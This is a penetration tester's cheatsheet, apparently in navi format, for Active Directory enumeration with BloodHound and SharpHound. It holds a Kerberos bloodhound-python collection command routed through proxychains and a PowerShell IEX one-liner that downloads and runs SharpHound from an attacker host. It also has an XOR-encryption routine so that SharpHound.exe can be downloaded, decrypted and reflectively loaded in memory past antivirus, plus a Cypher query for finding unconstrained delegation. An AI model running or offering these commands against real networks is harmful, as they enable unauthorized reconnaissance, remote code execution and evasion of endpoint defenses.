% bloodhound, sharphound

# bloodhound python kerberos (edit /etc/hosts case sensitive)
sudo proxychains -q bloodhound-python -u <VICTIM> -k -no-pass -ns <DNS_IP> -dc <HOSTNAME>.<FQDN> -d <FQDN> -c all --dns-tcp --dns-timeout 500 --zip  --disable-pooling --auth-method kerberos

# sharphound in memory powershell
IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All

# sharphound in memory exe xor encrypted (test needed)
<VAR>byteArray = [IO.File]::ReadAllBytes("/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [IO.File]::WriteAllBytes("$pwd/SharpHound.exe.xored", $byteArray) # on kali
$byteArray = (New-Object System.Net.WebClient).DownloadData("http://<LHOST>:8000/SharpHound.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [SharpHound.Program]::Main("-c All --OutputDirectory C:\Windows\Tasks".split(' '));

# multiple domains
Invoke-BloodHound -CollectionMethod All -SearchForest

# unconstrained delegation query
MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH "516" WITH COLLECT(dc) as domainControllers MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true}) WHERE NOT c in domainControllers RETURN p

$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
$ VAR: echo '$'
